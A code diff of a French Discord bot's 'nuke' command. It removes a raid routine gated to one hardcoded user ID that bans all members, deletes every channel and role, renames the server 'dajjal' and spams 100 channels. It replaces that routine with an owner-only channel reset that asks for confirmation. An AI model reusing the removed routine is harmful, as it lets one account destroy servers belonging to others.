@@ -1,113 +1,54 @@
-const { PermissionFlagsBits } = require('discord.js');
-const { errorEmbed, successEmbed } = require('../../utils/embeds');
+const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
 
-module.exports = {
-  name: 'nuke',
-  description: 'NUKE COMPLÈTE du serveur (destruction totale)',
-  aliases: ['destroy', 'apocalypse'],
-  async execute(message, args, client) {
-    const ALLOWED_ID = '754703887738470482';
+const client = new Client({
+  intents: [
+    GatewayIntentBits.Guilds,
+    GatewayIntentBits.GuildMessages,
+    GatewayIntentBits.MessageContent,
+  ],
+});
 
-    if (message.author.id !== ALLOWED_ID) {
-      return message.reply({
-        embeds: [errorEmbed('Accès Refusé', 'Vous n\'avez pas la permission d\'utiliser cette commande.')]
-      });
-    }
+const PREFIX = '=';
 
-    const guild = message.guild;
+client.on('messageCreate', async (message) => {
+  if (message.author.bot || !message.guild) return;
+  if (!message.content.startsWith(PREFIX)) return;
 
-    try {
-      const statusMsg = await message.reply({
-        embeds: [
-          successEmbed(
-            'NUKE en cours 💣',
-            'Destruction totale du serveur en cours...'
-          )
-        ]
-      });
+  const command = message.content.slice(PREFIX.length).trim().split(/\s+/)[0].toLowerCase();
+  if (command !== 'nuke') return;
 
-      // 1. Ban tous les membres (sauf le bot)
-      console.log('🔨 Ban de tous les membres...');
-      await guild.members.fetch();
-      for (const [, member] of guild.members.cache) {
-        if (member.user.id === client.user.id) continue; // Skip le bot
-        try {
-          await member.ban({ reason: 'NUKE - Destruction totale' });
-        } catch (err) {
-          console.error(`Erreur ban ${member.user.tag}:`, err.message);
-        }
-      }
+  const guild = message.guild;
 
-      // 2. Supprimer tous les salons texte et vocaux
-      console.log('🗑️ Suppression des salons...');
-      for (const channel of guild.channels.cache.values()) {
-        try {
-          await channel.delete('NUKE - Destruction totale');
-        } catch (err) {
-          console.error(`Erreur suppression salon ${channel.name}:`, err.message);
-        }
-      }
-
-      // 3. Supprimer tous les rôles (sauf @everyone)
-      console.log('🗑️ Suppression des rôles...');
-      for (const role of guild.roles.cache.values()) {
-        if (role.name !== '@everyone') {
-          try {
-            await role.delete('NUKE - Destruction totale');
-          } catch (err) {
-            console.error(`Erreur suppression rôle ${role.name}:`, err.message);
-          }
-        }
-      }
-
-      // 4. Renommer le serveur en "dajjal"
-      console.log('📝 Renommage du serveur...');
-      await guild.setName('dajjal');
-
-      // 5. Changer l'icon du serveur (photo dajjal)
-      console.log('🖼️ Changement de l\'icon...');
-      const dajjalIcon = 'https://images-ext-2.discordapp.net/external/FjY0VqCp5EUUvT3C_7w8kCjKEuKmGJlnG4DvHFDegbk/https/pbs.twimg.com/media/EvLkc8_VcAE8SJe.jpg'; // URL de l'image dajjal
-      try {
-        await guild.setIcon(dajjalIcon);
-      } catch (err) {
-        console.error('Erreur changement icon:', err.message);
-      }
-
-      // 6. Créer 100 salons appelés "dajjal"
-      console.log('📨 Création des 100 salons...');
-      let channelsCreated = 0;
-      for (let i = 1; i <= 100; i++) {
-        try {
-          await guild.channels.create({
-            name: `dajjal-${i}`,
-            type: 0 // 0 = text channel
-          });
-          channelsCreated++;
-          
-          if (i % 10 === 0) {
-            await new Promise(resolve => setTimeout(resolve, 1000));
-          }
-        } catch (err) {
-          console.error(`Erreur création salon dajjal-${i}:`, err.message);
-        }
-      }
-
-      await statusMsg.edit({
-        embeds: [
-          successEmbed(
-            'NUKE COMPLÉTÉE 💥',
-            `✅ Tous les membres ont été ban\n✅ Serveur renommé en "dajjal"\n✅ Icon changée en dajjal\n✅ Tous les salons supprimés\n✅ Tous les rôles supprimés\n✅ ${channelsCreated} nouveaux salons "dajjal" créés`
-          )
-        ]
-      });
-
-      console.log('✅ NUKE complétée avec succès !');
-
-    } catch (err) {
-      console.error('Erreur nuke:', err);
-      return message.reply({
-        embeds: [errorEmbed('Erreur', 'Erreur lors de la NUKE.')]
-      });
-    }
+  if (message.author.id !== guild.ownerId) {
+    return message.reply('❌ Réservé au propriétaire du serveur.');
   }
-};
+
+  await message.reply('⚠️ Tous les salons vont être supprimés. Tape `oui` dans les 15 secondes pour confirmer.');
+
+  try {
+    const collected = await message.channel.awaitMessages({
+      filter: (m) => m.author.id === message.author.id && m.content.toLowerCase() === 'oui',
+      max: 1,
+      time: 15_000,
+      errors: ['time'],
+    });
+  } catch {
+    return message.channel.send('⏱️ Annulé, temps écoulé.');
+  }
+
+  // On crée le nouveau salon d'abord
+  const general = await guild.channels.create({
+    name: 'général',
+    type: ChannelType.GuildText,
+  });
+
+  const channels = await guild.channels.fetch();
+  for (const [, channel] of channels) {
+    if (channel.id === general.id) continue;
+    await channel.delete('Nuke').catch(console.error);
+  }
+
+  await general.send('💥 Serveur nuke ! Tout est à refaire à zéro.');
+});
+
+client.login('TON_TOKEN');
